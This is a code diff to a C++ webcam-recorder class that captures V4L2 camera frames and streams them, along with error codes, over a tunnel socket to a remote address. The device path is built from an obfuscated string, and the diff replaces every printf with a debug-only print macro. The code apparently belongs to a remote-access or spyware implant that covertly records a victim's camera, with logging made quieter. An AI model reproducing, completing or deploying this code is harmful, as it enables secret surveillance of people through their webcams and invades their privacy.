@@ -1,4 +1,5 @@
 #include "clwebcam_recorder.hpp"
+#include "debug.hpp"
 
 // Define the frame delay in microseconds
 
@@ -11,7 +12,7 @@ void CLWebcamRecorder::run() {
         send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
         return;
     }
-    printf("[run] Initialization successful\n");
+    DEBUG_PRINT("[run] Initialization successful\n");
 
     while (!tunnel_shutdown_flag_) {
         fd_set fds;
@@ -22,10 +23,10 @@ void CLWebcamRecorder::run() {
         int rc = select(dev_fd_ + 1, &fds, NULL, NULL, &tv);
         if (rc < 0) {
             send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
-            printf("[run] Error with select\n");
+            DEBUG_PRINT("[run] Error with select\n");
             break;
         } else if (rc == 0) {
-            printf("[run] Timeout\n");
+            DEBUG_PRINT("[run] Timeout\n");
             continue;
         }
 
@@ -35,7 +36,7 @@ void CLWebcamRecorder::run() {
         buf.memory = V4L2_MEMORY_MMAP;
         if (ioctl(dev_fd_, VIDIOC_DQBUF, &buf) < 0) {
             send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
-            printf("[run] Error when dequeing the buffer\n");
+            DEBUG_PRINT("[run] Error when dequeing the buffer\n");
             break;
         }
         
@@ -49,7 +50,7 @@ void CLWebcamRecorder::run() {
         // Requeue the buffer
         if (ioctl(dev_fd_, VIDIOC_QBUF, &buf) < 0) {
             send_out(tunnel_socket_, EXEC_ERROR, (struct sockaddr*) &tunnel_addr_, &tunnel_addr_len_);
-            printf("[run] Error when requeing the buffer\n");
+            DEBUG_PRINT("[run] Error when requeing the buffer\n");
             break;
         }
         
@@ -77,11 +78,11 @@ int CLWebcamRecorder::webcam_init() {
 
     strncpy(input_path + sizeof(obf), str_device_num, num_size);
 
-    printf("[webcam_init] File name is: %s\n", input_path);
+    DEBUG_PRINT("[webcam_init] File name is: %s\n", input_path);
 
     dev_fd_ = open(input_path, O_RDWR);
     if (dev_fd_ < 0) {
-        printf("[webcam_init] Error while opening the dev\n");
+        DEBUG_PRINT("[webcam_init] Error while opening the dev\n");
         return -1;
     }
 
@@ -93,7 +94,7 @@ int CLWebcamRecorder::webcam_init() {
     fmt.fmt.pix.field = V4L2_FIELD_NONE;
     fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
     if (ioctl(dev_fd_, VIDIOC_S_FMT, &fmt) < 0) {
-        printf("[webcam_init] Error setting format\n");
+        DEBUG_PRINT("[webcam_init] Error setting format\n");
         return -1;
     }
 
@@ -103,7 +104,7 @@ int CLWebcamRecorder::webcam_init() {
     req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
     req.memory = V4L2_MEMORY_MMAP;
     if (ioctl(dev_fd_, VIDIOC_REQBUFS, &req) < 0) {
-        printf("[webcam_init] Error requesting buffer\n");
+        DEBUG_PRINT("[webcam_init] Error requesting buffer\n");
         return -1;
     }
 
@@ -115,14 +116,14 @@ int CLWebcamRecorder::webcam_init() {
         buf.index = i;
 
         if (ioctl(dev_fd_, VIDIOC_QUERYBUF, &buf) < 0) {
-            printf("[webcam_init] Error mapping the buffers\n");
+            DEBUG_PRINT("[webcam_init] Error mapping the buffers\n");
             return -1;
         }
         
         
         buffers_[i].start_= mmap(NULL, buf.length, PROT_READ | PROT_WRITE, MAP_SHARED, dev_fd_, buf.m.offset);
         if (buffers_[i].start_ == MAP_FAILED) {
-            printf("[webcam_init] Error mapping the buffers\n");
+            DEBUG_PRINT("[webcam_init] Error mapping the buffers\n");
             return -1;
         }
         buffers_[i].length_ = buf.length;
@@ -135,7 +136,7 @@ int CLWebcamRecorder::webcam_init() {
         buf.memory = V4L2_MEMORY_MMAP;
         buf.index = i;
         if (ioctl(dev_fd_, VIDIOC_QBUF, &buf) < 0) {
-            printf("[webcam_init] Error queuing the buffers\n");
+            DEBUG_PRINT("[webcam_init] Error queuing the buffers\n");
             return -1;
         }
     }
@@ -143,7 +144,7 @@ int CLWebcamRecorder::webcam_init() {
     // Start streaming
     unsigned int type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
     if (ioctl(dev_fd_, VIDIOC_STREAMON, &type)) {
-        printf("[webcam_init] Error starting stream\n");
+        DEBUG_PRINT("[webcam_init] Error starting stream\n");
         return -1;
     }
 
@@ -152,7 +153,7 @@ int CLWebcamRecorder::webcam_init() {
 
 int CLWebcamRecorder::send_frame(struct v4l2_buffer* __p_buf) {
     if (__p_buf->index >= BUFFER_COUNT) {
-        printf("[send_frame] invalid __index: %u\n", __p_buf->index);
+        DEBUG_PRINT("[send_frame] invalid __index: %u\n", __p_buf->index);
         return -1;  
     }
     void* p_buf = buffers_[__p_buf->index].start_;
